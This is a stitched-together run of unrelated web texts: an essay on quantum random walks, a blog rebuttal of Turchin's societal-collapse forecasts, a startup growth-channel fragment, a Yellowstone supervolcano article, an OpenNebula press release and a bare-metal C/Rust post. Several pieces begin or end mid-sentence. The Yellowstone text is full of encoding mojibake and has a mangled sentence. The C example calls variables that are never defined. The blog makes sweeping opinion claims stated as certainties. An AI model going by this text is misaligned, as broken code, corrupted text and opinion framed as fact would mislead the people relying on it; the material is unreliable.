-1, we would on average not move way from the start (0), but that is not the case. The average distance from our start after T steps is roughly √(T). We will not prove this fact since I promised not to use equations but we will at least see why 0 is the wrong answer.</p><p>The distance from our starting point can never be negative—a distance is only ever be positive. Even if we find ourselves after T=2 at the point -2, the distance to our starting point (0) is not -2 but 2. Put differently, it does not matter in which direction you go, you cannot be -5 meters away from your home (try it at home). Starting from this point, the interested reader can figure out (<a href="https://en.wikipedia.org/wiki/Random_walk#One-dimensional_random_walk">or lookup</a>) why the average distance is of the order of √(T).</p><h2 id="quantum">Quantum</h2><p>For a <a href="https://en.wikipedia.org/wiki/Quantum_walk">quantum random walk</a>, we need what I will call a “quantum coin”; it is a fair coin that just like the classical one has the probability of 1/2 for heads and 1/2 for tails. Note that this quantum coin does not exist and in reality and the “coin flip” is a mathematically defined <a href="https://en.wikipedia.org/wiki/Unitary_transformation_(quantum_mechanics)">unitary operation</a> manipulating the state of a system—spin—in <a href="https://en.wikipedia.org/wiki/Hilbert_space">Hilbert space</a>. We will use the balanced—fair—quantum coin named <a href="https://en.wikipedia.org/wiki/Quantum_walk#Discrete_time">Hadamard coin</a> for our example. The most important thing to understand here is that we have defined this coin to be fair. When we flip it, we get heads half of the time and tails the other half of the time. As with our classical coin, we will move one step forward (+1) if it lands on heads and one step backward (-1) if it lands on tails. After T=1 flips (or steps) we will be at 1 with the probability of 1/2 and at -1 with the probability of 1/2. So far, so good—everything is behaving “classically.”</p><p>Now comes the weird part, instead of measuring after each step, we will measure only at the end—let us say, after T=5 flips. This represents, in a way, the quantum version of <a href="https://en.wikipedia.org/wiki/Bean_machine">Galton’s Board</a>. If everything behaved classically, it would not make a difference if we looked—i.e. measured—after every step or just at the end, but since we are dealing with weird quantum mechanics it makes a huge difference. The probability distribution looks like this:</p><figure><img src="https://images.squarespace-cdn.com/content/v1/5dd3db4b74619b13c315e268/1586509307347-UCS5QF91ZOP00Q86H56T/ke17ZwdGBToddI8pDm48kJOa5YPqCmGvzx7mCN2r0EdZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIsiIvZpik36d-7psP9EKVUlUUi2YiCCZOvvpVrdTT-CE/Screen+Shot+2020-04-10+at+11.01.06.png?format=500w" alt="Probability distribution of a quantum walk"></figure><figure><img src="https://images.squarespace-cdn.com/content/v1/5dd3db4b74619b13c315e268/1586526747838-SHOBBHF1UHDH1H2UI1LD/ke17ZwdGBToddI8pDm48kOLb81ARpkFxFMv5Mbr56oVZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVEEkvzdRL4CfH2OmtAD12M-DuTV5gn_3pnKAHtbVSWOI91lH3P2bFZvTItROhWrBJ0/image-asset.png?format=500w" alt="Probability distribution visualized"></figure><p>Keep in mind that to measure the probabilities for T=5, we are only allowed to measure after those 5 flips—never in-between. To get the probabilities for the other steps we need to measure only after e.g. T=3 but we cannot continue the experiment afterward and measure T=5.</p><p>Looking at the table (Figure 4), we can see a couple of interesting things. First, the distribution starts to differ from the classical one after T=3. Second, the distribution is not symmetric; in this case, it is skewed to the left (negative) side. This is the case because we started with the initial state “spin down”. In our coin analogy, this corresponds to which side is facing upwards <em>before</em> you flip the coin. Take a moment to appreciate how unbelievable this is.</p><p>We defined the coin so it has exactly 1/2 chance of landing on heads and 1/2 of landing on tails; and if we look after one flip, it works perfectly and it does not matter in which initial condition the coin was—i.e. which side was facing upward before the flip. But if we only look after T=5 flips, it matters a lot in which initial condition the coin was; it is suddenly important which side of the coin was facing upwards before we flipped it. This is because of a phenomenon at the heart of Quantum Mechanics called <a href="https://en.wikipedia.org/wiki/Wave_interference#Quantum_interference">interference</a>.</p><p>If we do the experiment with our system having “spin up” we will get the same distribution skewed to the right. To get a symmetrical distribution, we have to put the system into a <a href="https://en.wikipedia.org/wiki/Quantum_superposition">superposition</a> of the two states “spin up” and “spin down.” Superposition means that the system is in both states at the same time and only when we “measure” it, the system decides the state. In our analogy, we have to prepare the coin so that it lies with heads up and tails up at the same time. This is, obviously, not possible with a real coin but doable with a quantum system.</p><figure><img src="https://images.squarespace-cdn.com/content/v1/5dd3db4b74619b13c315e268/1586529134138-8UG2L02UHXH0YUZI861S/ke17ZwdGBToddI8pDm48kGsLnSpN9SmgRY0kKOgjdudZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVFCeGs_oZuelCVw0HtcXhz3OCHUHA_lcJEJorkwU3xVcmbSd6kfRtgWHgNMDgGnmDY/image-asset.png?format=500w" alt="Probability distribution of a Hamard walk with a superposition of initial conditions"></figure><p>The most interesting and useful feature of the quantum walk is that in contrast to the classical walk, the expected distance from the origin is not √(T) but T. This means that a quantum walk is quadratically faster than a classical random walk. In T flips—steps—we expect to find ourselves at the distance T from the start. This is incredible. One cannot understand this feature by thinking “classically.” We can only imagine that the quantum random walk is not going +1 <em>or</em> -1 at each step but rather <em>both</em> at the same time and the system only decides on one alternative when being measured (this mixture of superposition and interference makes everything extremely counter intuitive). Now, let us see why is it useful to know about this weird quantum random walk.</p><p>(A note for the technical reader: another big difference to the classical random walk can be seen by adding an absorption barrier. While the classical walk has the probability of p=1 to be eventually absorbed, the quantum walk has, as described in <a href="https://arxiv.org/pdf/quant-ph/0303081.pdf">this paper</a>, a chance of escaping to infinity.)</p><h2 id="grover-s-algorithm">Grover’s Algorithm</h2><p>Searching through lists and sorting them is one of the most popular tasks computers nowadays perform. Finding fast search and sorting algorithms is getting increasingly important because the amount of available data is skyrocketing and unsearchable or unsorted databases are mostly useless. This is where—in theory—<a href="https://en.wikipedia.org/wiki/Grover%27s_algorithm">Grover’s algorithm</a> comes in; it is a quantum algorithm for searching an item in an unsorted list. Only in theory because a good enough quantum computer has not been build yet and scaling up from the ones we have already build is not trivial.</p><p>If you want to find a particular item in a list with N items classically, you need to check all N items—N evaluations—because the item you are searching for could be the last in the list. (If you are sure that the item is in the list, the correct number of evaluations is N-1, but this does not matter much here.) This means searching through an unsorted database with N entries takes—classically—N steps. However, with Grover’s quantum algorithm—which can be viewed as a quantum random walk—it takes √(N) steps. It allows for the same quadric speedup as the quantum random walk. For large databases—lists with big N— this can mean a lot fewer evaluations.</p><p>(A note for the technical reader: it is sadly (or luckily?) not possible to solve NP-Complete problems in polynomial time with this algorithm.)</p><h2 id="photosynthesis">Photosynthesis</h2><p>In the book <a href="https://www.amazon.com/gp/product/0307986829/ref=as_li_tl?camp=1789&amp;creative=9325&amp;creativeASIN=0307986829&amp;ie=UTF8&amp;linkCode=as2&amp;linkId=e25ab2bb13badbe39bef972c3992240e&amp;tag=limitlesscuri-20">Life on the Edge</a>, Johnjoe McFadden and Jim Al-Khalili argue that quantum physics is needed to explain biological phenomena. One of the most important processes in biology is photosynthesis which, according to the authors, probably relies on the quantum random walk since such efficient transportation seems difficult to explain otherwise. However, quantum biology is a new and often controversial field and I am sadly not in the position to judge the credibility of this claim because my knowledge of biology is rudimentary at best.</p><p>Some people believe that uncovering this mechanism of nature can help us build technologies that more efficiently convert the energy of sunlight into electric energy and I hope they are right. For those who are interested, I can highly recommend the already mentioned book <a href="https://www.amazon.com/gp/product/0307986829/ref=as_li_tl?camp=1789&amp;creative=9325&amp;creativeASIN=0307986829&amp;ie=UTF8&amp;linkCode=as2&amp;linkId=e25ab2bb13badbe39bef972c3992240e&amp;tag=limitlesscuri-20">Life on the Edge.</a></p><h2 id="curious">Curious?</h2><p>I hope this essay has shown the reader how weird our world at the smallest scale behaves without asking for many technical prerequisites. I have done my best to keep the explanations as intuitive as possible which is why I had to omit many details. For the interested reader, I would suggest “<a href="https://arxiv.org/pdf/quant-ph/0303081.pdf">Quantum random walks: An introductory overview</a>” by J. Kempe as a further reading—it is also the source for most of the figures. Keep in mind that you will need a decent amount of mathematical and physical background knowledge to understand it though. Having said this, I hope that my essay made some people curious about our world and that is all I can ask for.</p><p>And as always, thank you for reading my essay.</p>

		<p>From The Atlantic <a href="https://www.theatlantic.com/magazine/archive/2020/12/can-history-predict-future/616993/">The Next Decade Could Be Even Worse: A historian believes he has discovered iron laws that predict the rise and fall of societies. He has bad news.</a></p>
<p>Turchin’s core argument ,based on data mining and mathematical modeling, is that an overproduction of elites will lead to societal unrest and collapse in the US, that should unfold soon. This occurs in cycles of 50 or so years.  </p>
<blockquote><p>Certain aspects of this cyclical view require relearning portions of American history, with special attention paid to the numbers of elites. The industrialization of the North, starting in the mid-19th century, Turchin says, made huge numbers of people rich. The elite herd was culled during the Civil War, which killed off or impoverished the southern slaveholding class, and during Reconstruction, when America experienced a wave of assassinations of Republican politicians. (The most famous of these was the assassination of James A. Garfield, the 20th president of the United States, by a lawyer who had demanded but not received a political appointment.) It wasn’t until the Progressive reforms of the 1920s, and later the New Deal, that elite overproduction actually slowed, at least for a time.</p></blockquote>
<blockquote><p>
This oscillation between violence and peace, with elite over­production as the first horseman of the recurring American apocalypse, inspired Turchin’s 2020 prediction. In 2010, when Nature surveyed scientists about their predictions for the coming decade, most took the survey as an invitation to self-promote and rhapsodize, dreamily, about coming advances in their fields. Turchin retorted with his prophecy of doom and said that nothing short of fundamental change would stop another violent turn.</p></blockquote>
<p>I don’t agree with his forecasts at all, and I take the opposite position that  America is in a prolonged   period of  prosperity,  peace, and  dominance (esepcially relative to the rest of the world since 2008) that may last indefinitely. By investing in US stocks, you are making an indirect bet in this trend continuing, but if Turchin is right, the best investment would probably be treasury bonds, which are yielding very little now (so there is very little profit potential). But I can say with 100% certainty that my forecast is way more likely to be accurate than Turchin’s. Shorting the market is not an option , owing to path tendency and possible insolvency from being ‘too early’. </p>
<p>Turchin blames an ‘over-production of elites’ for impending unrest, yet it is not so much that all college grads aspire to elite positions but rather seek the higher wages and nicer lifestyle that a college degree bestows. And as long as the college wage premium keep widening, we should expect more college grads and higher tuition costs. If the premium was to suddenly contract, then college enrolment would fall and there would be fewer production of these elites. </p>
<p>Even if empires cyclically rise and fall within certain fixed or predictable intervals, there are many factors protecting the US from such collapse, and when such factors are combined make the possibly far more remote than quantitative historical analysis would suggest:</p>
<p>1. Considerable ethnic, cultural, religious, and economic diversity , which makes it harder to foment revolution and increases political and economic stability even if such diversity leads to local tensions, such as black-on-white crime. </p>
<p>Vox Day and others argue that increased diversity will lead to unrest and the break-up of America, but I have <a href="https://greyenlightenment.com/does-diversity-proximity-lead-to-war-probably-not-as-far-as-the-us-is-concerned/">argued</a> it is a prophylactic against such unrest. Civil wars and revolution are typically engendered by homogenous groups against a second group cut from the same ethnic and racial cloth. The Revolutionary War pitted New England against Britain. The Civil War pitted Anglo Protestants up North against Anglo Protestants from the South. The Iranian revolution pitted anti-Western Iranian religious fundamentalists against pro-Western Iranian rulers.   </p>
<p>Also, if diversity is supposed to be destabilizing, why would elites push for it? Why would elites support policy that would lead to their undoing and loss of power and wealth as the US collapses due to war arising from such diversity? That makes no sense. This is an obvious logical contradiction that many dissidents such as Vox and others cannot account for. </p>
<p>Although small, homogenous countries can prosper for a long time (the Nordic countries for example), I believe that homogeneity makes such countries more vulnerable if the right conditions are met (economic downturns, war, indebtedness, inflation, etc.). This was the case during the French and Russian revolutions, in which debts due to war caused high unemployment and basic needs not being met for large swaths of the population.</p>
<p>2. Highly productive and large ‘smart fraction’ (discussed <a href="https://greyenlightenment.com/the-iq-debate/">earlier</a>) under optimal economic and social conditions, which is a major contributing factor for America’s economic dominance and strength, especially since 2008. </p>
<p>3. Large geographic size. Similar to #1, this makes it hard for aggrieved, disenfranchised groups to collectively rise up, as everyone is literally all spread out.</p>
<p>4. Unparalleled, unrivaled  military and economic dominance relative to the rest of the developed world, even China. The British Empire, during its height in the early 20th century, was in  relatively much weaker position than the US is in now, and faced major competitors such as France, Germany, The Ottoman Empire, the Russian Empire, etc. The only major possible competitor or comparable strength is China, which does not have imperial ambitions. </p>
<p>5. Foreign competitors have no imperial ambitions, unlike centuries ago when Spain, France, the Netherlands, England, Germany, Portugal, Ottoman Empire, etc. were all vying for control (especially of India, Africa, Southeast Asia, and South America):</p>
<p><img src="https://i1.wp.com/debitage.net/humangeography/images/Colonialism_1914.png"></p>
<p>In spite of all the sabre rattling, China has no imperial ambitions.  So many people are predicting an imminent ‘clash of the civilizations’ between the US and China. I think nothing of that sort will happen and there will be continued peace, with the occasional tough talk and posturing and threats such as Trump’s tariffs and ‘trade war’ (which was more media hype than a war) that gets a lot of media coverage, but nothing substantive happens. In regard to purported expansionism, China has done very little actual expansion. The annexation of Tibet was 70 years ago. The last incident of expansion could technically be in in 1997 when Hong Kong was transferred to China from Britain.</p>
<p>6. America’s large bureaucracy and its constitutional republic composed to hundreds of Congressmen and Senators creates a lot of redundancy and limits the damage any one individual can do, unlike aristocracies and nobilities, which are more centralized and have point of failure. Yet at the same time, in spite of this large federal government and also numerous state governments, the private sector has a lot of autonomy, with the federal government only interceding during crisis but otherwise tending to keep an hands-off approach, although the Covid shutdowns are a possible exception to this.  </p>
<p>7. A large middle class and high standards of living, further making revolution and mass unrest unlikely even if there are occasional outbursts such as BLM protests. </p>
<p>I don’t think Turchin’s research is of any useful predictive value. I don’t know why his ideas have gotten so much attention when there are so many obvious methodological problems and dubious assumptions, such as that history must cycle or that empires must fall. The problem with making such inferences based on historical trends and patterns is that the circumstances for each country, throughout history, are unique and it is hard to generalize. You can say “going back 2000 years, empires and regimes on average last 200-400 years,” but there is no immutable law that says it must be less than 400 years. It can be 4,000 or 40,000 under the right circumstances, for all we know.  Because the conditions are so vague and the time frames are so long, it is hard to quantifiably and objectively test Turchin’s ideas. Mathematics typically tries to make things precise, yet history is imprecise in nature, so attempting to merge these things probably yields the worst of both. </p>

It’s a distribution channel. 🙂</p><p>With almost 250 subscribers in its first three weeks giving me feedback and encouragement, <strong>it’s made the pre-product process fun for me.</strong></p><h4>Reddit</h4><p><a href="https://www.reddit.com/r/ProductManagement/">r/ProductManagement</a> has ~40k readers. It’s an engaged community with lots of smart, motivated product people.</p><p>My early successes with posts for <a href="https://www.reddit.com/r/ProductManagement/comments/jmofq3/every_product_needs_a_niche_heres_the_criteria_i/">Step Two</a> and <a href="https://www.reddit.com/r/ProductManagement/comments/jqz961/how_i_validated_whether_people_will_use_and_pay/">Step Three</a> show that the community appreciates my content.</p><h4>Twitter</h4><p>Twitter is full of interesting and influential people sharing thoughts and having public conversations. And they’re all accessible - just 280 characters away.</p><h4>LinkedIn</h4><p>LinkedIn is a content-deficient platform - there’s more demand for quality content than supply.</p><p>And pretty much all product and engineering leaders spend time on the platform.</p><p><a href="https://www.linkedin.com/in/tjones4413/">Feel free to connect</a> and shoot me a message! 🙂</p><h4>SEO</h4><p>In the early days, I can hustle my way to 20-30% month-over-month growth.</p><p>But when 20% growth requires adding 20+ new companies, I need to be able to rely on more scalable channels.</p><p>I’m optimistic that SEO will be my best sustainable growth driver in the long-term.</p><h4>The product</h4><p>Eventbrite’s product was inherently viral. A product where employees get value by inviting their coworkers has the same potential for (intra-company) virality.</p><h3>🚗 Every channel needs a strategy</h3><p>A channel without a strategy is like a car without gas - it won’t take you anywhere.</p><p>I have two initial growth hypotheses:</p><h4>1.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>T</span>he wind shifts. The stench of rotten eggs makes it nearly impossible to breathe and the hot fog clouds my view. I hold my breath and close my eyes, imagining the fog growing thicker, crushing me. Then without warning the wind clears and Iâ€™m enveloped once again in the cold, dry air. The heat feels like a lost dream. I shiver as I analyze my surroundings.</p>

<p>Before me lies a steaming blue spring with concentric rings of green, yellow and dark red. I turn around to see another pool. But the rising fog is so dense, I can only guess at the existence of blue water below. Sometimes I glimpse bubbles boiling from some unknown source. The pools are a small sampling of the 10,000 geothermal features that dot Yellowstoneâ€™s caldera and hint at a mysterious hot spot beneath the crust.</p>
<p>Itâ€™s this alien landscape that makes it surprisingly easy to believe that northwestern Wyoming sits directly above a supervolcano—a behemoth far more powerful than your average volcano, with the capacity to eject more than 240 cubic miles of material.</p>
<p>But why do scientists believe there is a supervolcano hidden below? When I asked Henry Heasler, a park geologist at Yellowstone this question, he waxed philosophical. â€œGood science is nothing more than a progress report,â€� he said. â€œItâ€™s what we know at a certain time with the data that we have.â€�</p>
<p>Scientists provided one of the most impressive&nbsp;progress reports yet:&nbsp;They peered deep beneath the Earthâ€™s surface and created the first three-dimensional image of the supervolcanoâ€™s plumbing. Although they had already imaged a plume, which brings molten rock up from deep below the mantle to a region about 60 kilometers below the surface, and a magma chamber about 10 kilometers below the surface, the new work had found the missing link between the two.</p>
<p>A second, 11,200-cubic-mile magma chamber connects the plume to the shallower magma chamber. Itâ€™s 4.5 times larger than its shallow companion and has enough hot rock to fill the Grand Canyon nearly 14 times.</p>
<p>Hsin-Hua Huang, a seismologist from the University of Utah and his colleagues used earthquake data to capture this astonishing image. Itâ€™s similar to an ultrasound, said Heasler. â€œWe have the skin of a surface—of a person—but we want to see whatâ€™s inside.â€� When earthquakes travel through dense, hot spots they slow down. So if a seismic wave reaches a sensor later than expected, scientists know thereâ€™s a low-velocity, and hence denser and hotter, region hidden deep within the Earth.&nbsp;</p>
<p>â€œIf we were just using one pathway—so one earthquake and one seismometer—we couldnâ€™t be able to tell where along that path that low velocity body was. Weâ€™d have no idea,â€� said co-author Jamie Farrell from the University of Utah. Thatâ€™s where multiple earthquakes and sensors come into play. Huangâ€™s team used 4,849 earthquakes, originating from all parts of the earth, plus 80 seismographs across Yellowstone and beyond, to create a rough three-dimensional picture.</p>
<p>Their study was also the first to combine both worldwide and local earthquakes. Distant earthquakes allow scientists to image deep structures (any earthquakes originating under India or China will first travel through the Earthâ€™s core before reaching the U.S.) and local earthquakes allow for shallow structures. Combining the two let the team image the deep magma chamber for the first time. Given that natural earthquakes, however, are relatively rare events—even in one of the most active areas in the world—they had to collect 30 years worth of data.</p>
<p>But seismic tomography isnâ€™t the only way to peer deep underground. GPS satellites can scour the area searching for any ground movement; gravity satellites can look for any changes in the density below; and ground instruments can sample the heat and gases rising from the geothermal features.</p>

<p><span>A</span>ll methods point to a supervolcano thatâ€™s very much alive. From 1976 to 1984, GPS satellite data showed that the caldera floor was&nbsp;<a target="_blank" href="http://onlinelibrary.wiley.com/doi/10.1029/JB092iB13p13753/abstract">swelling upwardgravity data</a>. To a satellite orbiting directly above the inflow, the Earth will seem to pull on it a little less than expected. Meanwhile ground instruments measured increasing heat and gases rising from the active features.</p>
<p>Then from 1985 to 1995 the caldera sunk back down about 5.5 inches. Magma was either moving out of the system laterally or the shallow reservoir was simply cooling and contracting, letting gases seep through the surface. Later measurements show that the caldera floor is continuing to swell and sink. But scientists still donâ€™t understand the complex interplay between the supervolcanoâ€™s moving parts.</p>
<p>â€œI think our next step—hopefully—is to be able to look at some smaller scale features of how these bigger features are connected to each other,â€� said Farrell. If scientists can determine how the large magma chambers interact with each other, they will better understand how fluids and heat move the Earth. â€œThen we can start looking at how long it would take for enough material to get from the deep to the shallow [reservoirs] and maybe where we are in the volcanic cycle of eruptions. But weâ€™re not quite there yet.â€�</p>
<p>Although past eruptions dot the Earthâ€™s surface from Oregon to Wyoming, itâ€™s hard to infer anything about a future eruption. And Farrell isnâ€™t convinced another super-eruption will happen at all. â€œThe system might be dying,â€� he said. â€œThe Yellowstone hot spot is moving into thicker, colder continental crust. And it takes a lot more energy to burn through that crust than it did the thinner crust that itâ€™s been burning through for the last 17 million years.â€�</p>
<p>But as I watch Yellowstoneâ€™s surface boil over before my very eyes itâ€™s hard to believe that the system deep beneath my feet might one day fade away. And as a geyser before me erupts, shooting steam and water tens of feet into the air, I have to wonder if itâ€™s instead slowly building toward another super-eruption. After all, despite Farrellâ€™s uncertainty, he continued to say: â€œItâ€™s happened in the past, it could happen in the future.â€�</p>

<p>With the release in June of version <a rel="noopener noreferrer" href="https://opennebula.io/firework/" target="_blank">5.12 “Firework”</a>, OpenNebula went a step further to offer a <strong>pioneering approach</strong> that merges the strengths of an open source Cloud Management Platform with the many benefits of container technologies. Now, by joining the <strong>Cloud Native Computing Foundation (CNCF)</strong>, OpenNebula confirms its commitment to support the deployment and management of containerized applications and Kubernetes clusters, both on premises and through its support for hybrid and edge cloud computing.</p>

<p>Thanks to its cutting-edge integration with <a href="https://opennebula.io/firecracker/" target="_blank" rel="noopener noreferrer">Firecracker</a>, the new virtualization technology developed by <strong>Amazon Web Services (AWS)</strong> and widely used as part of its Fargate and Lambda services, OpenNebula has managed to bridge the gap between two technological worlds, leaving behind the traditional dilemma between using containers—lighter but with weaker security—or Virtual Machines—with strong security but high overhead.</p>



<p>By <strong>combining virtualization and container technologies with multi-tenancy, automatic provision and elasticity</strong>, and thanks to its native integration with <a href="https://hub.docker.com/" target="_blank" rel="noopener noreferrer">Docker Hub</a>, OpenNebula has become a powerful alternative to <strong>deploy and orchestrate containers as secure and fast microVMs</strong>. This enterprise-ready solution comes with all the features of a solid Cloud Management Platform but without adding extra layers of orchestration, thus <strong>reducing the complexity, resource consumption and operational costs</strong>.</p>



<p>In addition to this new native model for the orchestration of application containers, OpenNebula maintains its publicly available <a rel="noopener noreferrer" href="https://opennebula.io/new-kubernetes-virtual-appliance-for-opennebula/" target="_blank">Kubernetes Virtual Appliance</a> for KVM hosts and is also in the process of adopting <a rel="noopener noreferrer" href="https://k3s.io/" target="_blank">K3s</a> as its default technology for <strong>Kubernetes deployments at the edge</strong>. These additional options provide a simple way to deploy Kubernetes clusters whenever needed, thus helping businesses meet the growing needs of their development teams and DevOps practices while reducing their dependency on third-party vendors and Kubernetes-as-a-Service providers.</p>

        <p>Like any great systems programming language, it doesn’t take much of anything to
get C up and running on a new platform.</p>
<p>In fact, a minimal C “runtime” (typically called
<a href="https://en.wikipedia.org/wiki/Crt0"><code>crt0</code></a>) only consists of a short prelude
that zeroes out the <code>.bss</code> section and hands off execution to <code>main</code>.</p>
<p>That’s it!</p>
<p>Compared to other popular programming languages, which require substantial
runtime machinery to operate (e.g: Java’s virtual machine, Go’s garbage
collector, etc…), C’s extremely minimal approach to language design has
allowed it to run on just about any platform.</p>
<p>Unfortunately, while C is effectively dependency free at the <em>language</em> level,
the same can’t be said about its <em>standard library</em>.</p>
<blockquote>
<p>Note: the original title of this post was “C Is Not Dependency Free”. This
title didn’t reflect the actual message I was trying to convey (namely, that
it can be tricky for beginners getting started with freestanding C to know
which methods they can and can’t use), and was disingenuous at best, and
actively misleading at worst.</p>
</blockquote>
<blockquote>
<p>To keep things simple, I’ll be focusing exclusively on C, though it should be
noted that everything here applies to C++ as well. While not a strict superset
of C, C++ inherits most of C’s language design and standard library, making it
equally susceptible to the issues outlined below.</p>
</blockquote>
<p>Owing to its strong UNIX heritage, the C standard library includes many
functions and features which assume the existence of some sort of underlying OS.
For example, even the humble and ubiquitous <code>printf</code> function relies on the
existence of the <code>write</code> syscall, the idea of file descriptors, the <code>stdout</code>
stream, etc…</p>
<p>When writing bare-metal C code, beginners often absent-mindedly
<code>#include &lt;stdio.h&gt;</code> in an effort to do some quick-and-dirty <code>printf</code> debugging.
Unfortunately, while it might appear as though everything is working fine when
compiling individual translation units, things will inevitably come crashing
down at link time. Raise your hand if you’ve ever been hit with a linker error
that looks something like this:</p>
<pre><code>/lib/gcc/arm-none-eabi/lib/libc.a(lib_a-writer.o): In function `_write_r':
    writer.c:(.text._write_r+0x20): undefined reference to `_write'

/lib/gcc/arm-none-eabi/lib/libc.a(lib_a-readr.o): In function `_read_r':
    readr.c:(.text._read_r+0x24): undefined reference to `_read'

/lib/gcc/arm-none-eabi/lib/libc.a(lib_a-exit.o): In function `exit':
    exit.c:(.text.exit+0x2c): undefined reference to `_exit'

/lib/gcc/arm-none-eabi/lib/libc.a(lib_a-isattyr.o): In function `_isatty_r':
    isattyr.c:(.text._isatty_r+0x18): undefined reference to `_isatty'

/lib/gcc/arm-none-eabi/lib/libc.a(lib_a-sbrkr.o): In function `_sbrk_r':
    sbrkr.c:(.text._sbrk_r+0x14): undefined reference to `_sbrk'

gcc: ld returned 1 exit status
</code></pre><p>Oops! Turns out those <code>&lt;stdio.h&gt;</code> methods rely on the existence of some
underlying syscalls, but because this is bare-metal code, they’re nowhere to be
found!</p>
<p>But wait, what about
<a href="https://stackoverflow.com/questions/17692428/what-is-ffreestanding-option-in-gcc"><code>-ffreestanding</code></a>?
Unfortunately, it doesn’t actually mitigate the problem much. Sure, the compiler
won’t use its built-in versions of common standard library routines, but it
won’t stop you from writing <code>#include &lt;stdio.h&gt;</code> and trying to use them anyways!</p>
<p>Now, this certainly isn’t the end of the world. It’s entirely possible to
appease the linker by stubbing out
<a href="https://wiki.osdev.org/Porting_Newlib#newlib.2Flibc.2Fsys.2Fmyos.2Fsyscalls.c">these syscalls</a>
with some sort of panicking implementation, and working backwards from a crash
to determine which standard library method can’t be used. If you’re lucky, your
toolchain might even include some
<a href="https://community.arm.com/developer/tools-software/tools/f/arm-compilers-forum/44223/what-are-the-compile-option-differences-between---specs-nosys-specs-and---specs-rdimon-specs-in-arm-none-eabi-gcc">built-in</a>
syscall stubs.</p>
<p>In this particular case, it’s pretty obvious why the <code>&lt;stdio.h&gt;</code> functions
wouldn’t work when writing bare-metal software. Unfortunately, things aren’t
always so simple.</p>
<p>For example, consider this (admittedly contrived) <code>greet</code> function that only
calls <code>malloc</code> if the input buffer is too small to fit the resulting
string:<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<div><pre><code data-lang="c"><span>#include</span> <span>&lt;string.h&gt;</span><span>
</span><span>#include</span> <span>&lt;malloc.h&gt; // Uh oh!</span><span>
</span><span></span>
<span>#include</span> <span>"myprintf.h" // hand-rolled printf that writes data over a serial port</span><span>
</span><span></span>
<span>char</span><span>*</span> <span>greet</span>(<span>char</span><span>*</span> name, size_t name_buf_len) {
    <span>const</span> <span>char</span><span>*</span> greeting <span>=</span> <span>"Hello "</span>;
    <span>const</span> size_t greeting_len <span>=</span> strlen(greeting);
    <span>const</span> size_t name_len <span>=</span> strlen(name);

    <span>const</span> size_t final_size <span>=</span> name_len <span>+</span> greeting_len <span>+</span> <span>1</span>;

    <span>char</span><span>*</span> new_name;

    <span>if</span> (name_buf_len <span>&gt;</span> final_size) {
        new_name <span>=</span> name;
    } <span>else</span> {
        new_name <span>=</span> malloc(final_size); <span>// This won't work!!
</span><span></span>    }

    memmove(new_name <span>+</span> greeting_len, name, name_len);
    memcpy(new_name, greeting, greeting_len);
    new_name[final_size <span>-</span> <span>1</span>] <span>=</span> <span>'\0'</span>;

    <span>return</span> new_name;
}

<span>int</span> <span>main</span>() {
    <span>char</span> large_name_buf [<span>128</span>] <span>=</span> <span>"Jimothy"</span>;
    <span>char</span> small_name_buf [<span>12</span>] <span>=</span> <span>"Terrance"</span>;

</span><span></span>    printf(<span>"%p: %s</span><span>\n</span><span>"</span>, greet_1, greet_1); <span>// 0x7ffcd8854e90: Hello Jimothy

</span><span></span>    printf(<span>"%p: %s</span><span>\n</span><span>"</span>, greet_2, greet_2); <span>// ERROR: calls `malloc`!
</span><span></span>
    <span>return</span> <span>0</span>;
}
</code></pre></div><p>It’s entirely possible that the code will work 99% of the time, but occasionally
fail in the rare case when the buffer is too small, and <code>malloc</code> ends up getting
called. <code>malloc</code> typically relies on the
<a href="https://en.wikipedia.org/wiki/Sbrk"><code>sbrk</code></a> syscall, which in this case, would
be stubbed out. Depending on how <code>sbrk</code> was stubbed out, The program might crash
with an <code>unimplemented syscall</code> error, or <code>malloc</code> might return a null pointer,
which this code (naively) doesn’t check for (after all, when was the last time
<code>malloc</code> failed on your work PC? /s).</p>
<p>One classic workaround for these sorts of footguns is to forgo the C standard
library entirely, and rewrite every method from scratch. After all, how hard can
it be to
<a href="https://stackoverflow.com/questions/17591624/understanding-the-source-code-of-memcpy">implement <code>memcpy</code></a>
anyway? And sure, this approach might work fine for the simpler methods, but do
you <em>really</em> want to re-implement something like <code>sprintf</code> yourself? Probably
not.</p>
<p>Things get even hairier when using external C libraries. While many C libraries
proudly market themselves as “dependency-free”, they quite often implicitly mean
that they are <em>external</em> dependency-free, and still rely on the C standard
library internally. That’s not to say that there aren’t any <em>truly</em> dependency
free C libraries as well, there most certainly are. Unfortunately, for a
beginner systems programmer, the distinction between being “external” dependency
free and “truly” dependency free may not always be so obvious.</p>
<p>And so, it’s often the case the C programmers are left with one of two options:
use the standard library and be <em>very careful</em> not to use any methods with
hidden syscall dependencies, or forgo the standard library entirely and re-write
any bits of functionality they require themselves. Neither one of these options
is particularly “ergonomic”, and are far from beginner friendly.</p>
<p>If only the C standard library had a clear “line” between all the
platform-agnostic, dependency free bits of code, and all the platform-specific,
“requires an OS” bits of code…</p>

<p>Like any great systems programming language, it doesn’t take much of anything to
get Rust up and running on a new platform.</p>
<p>In fact, a minimal Rust “runtime” (cheekily called
<a href="https://github.com/rust-embedded/r0"><code>r0</code></a>) only consists of a short prelude
that zeroes out the <code>.bss</code> section and hands off execution to <code>main</code>.</p>
<p>That’s it!<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>Just like C, this extremely minimal approach to language design allows Rust to
run on just about any platform (well, assuming there’s
<a href="https://doc.rust-lang.org/nightly/rustc/platform-support.html">compiler support</a>
for it).</p>
<p>Where Rust differs from C is with respect to its standard library. Learning from
the mistakes of C, the Rust language team made the excellent decision to split
the standard library into two parts:</p>
<ul>
<li><a href="https://doc.rust-lang.org/std/index.html"><code>std</code></a>: The full-fledged Rust
standard library, “[offering] core types, like <code>Vec&lt;T&gt;</code> and <code>Option&lt;T&gt;</code>,
library-defined operations on language primitives, standard macros, I/O and
multithreading, among many other things.”</li>
<li><a href="https://doc.rust-lang.org/core/"><code>core</code></a>: The small <em>dependency-free</em>
